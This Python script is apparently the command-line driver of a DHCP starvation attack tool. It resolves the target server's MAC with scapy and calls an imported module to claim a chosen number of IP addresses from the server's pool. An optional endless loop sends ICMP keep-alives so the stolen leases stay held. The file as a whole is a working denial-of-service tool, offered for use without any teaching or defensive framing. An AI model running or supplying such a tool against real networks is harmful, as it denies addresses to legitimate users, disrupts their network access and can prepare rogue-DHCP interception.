import dhcp
import sys
import argparse
from scapy.all import getmacbyip, conf



def handle_args(args):
    # Create the parser
    parser = argparse.ArgumentParser()

    # Add the -d/--debug option
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')

    # Add other arguments
    parser.add_argument('--server_ip', required=True, help='Required IP address of the server')
    parser.add_argument('--ips_to_starve', type=int, required=True,help='Required Amount of IPs to occupy')
    parser.add_argument('--server_mac', help='MAC address of the server')
    parser.add_argument('--interface', required=False, help=f"Network interface to use. Will use {conf.iface} (conf.iface) in case none provided")
    parser.add_argument('--keep_alive_while_starving', action='store_true', required=False, help=f"Keep starved IP's alive while starvation")
    parser.add_argument('--keep_alive', action='store_true',required=False, help=f"Keep starved IP's alive after starvation")
    

    return parser.parse_args()


dhcp.args=handle_args(sys.argv)

if dhcp.args.server_mac is None:
    dhcp.args.server_mac = getmacbyip(dhcp.args.server_ip)
    if dhcp.args.server_mac is None:
        print("cant get the server mac")
        exit(1)

if dhcp.args.interface is not None : conf.iface = dhcp.args.interface



occupied_ips = dhcp.starve_ips(dhcp.args.server_ip, dhcp.args.server_mac, conf.iface, dhcp.args.ips_to_starve)
if(dhcp.args.debug):
    print('Got these IP\'s')
    for ip in occupied_ips:
        print(ip)
if(len(occupied_ips) == 0):
    print('[-]No ip occupied')
    exit(1)


if dhcp.args.keep_alive :
    while(True):
        dhcp.keep_ips_alive_icmp(occupied_ips, dhcp.args.server_ip, dhcp.args.server_mac)

